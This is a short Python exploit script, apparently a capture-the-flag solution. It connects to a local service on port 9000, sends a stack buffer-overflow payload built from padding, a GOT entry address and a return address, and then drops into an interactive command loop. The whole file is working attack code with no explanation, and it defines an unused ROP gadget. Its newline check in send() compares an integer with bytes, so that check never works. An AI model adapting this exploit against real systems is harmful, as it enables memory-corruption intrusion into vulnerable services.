import socket
import readline

host = '127.0.0.1'
port = 9000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None, decode=True):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  if decode:
    print(res.decode('utf-8'))
  else:
    print(res)
  return res

def recvuntil(stop, decode=True):
  res = b''
  while stop not in res:
    res += recv(decode=decode)
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()


write_got  = 0x602fa8
write_func = 0x400907
padding = b'9'*0x30 + write_got.to_bytes(8, 'little') + b'A'*16

# gadget
pop_rdi = 0x400a43

payload  = padding
payload += write_func.to_bytes(8, 'little')

recvuntil(b'> ')
input()
send(payload)
recv()
interact()
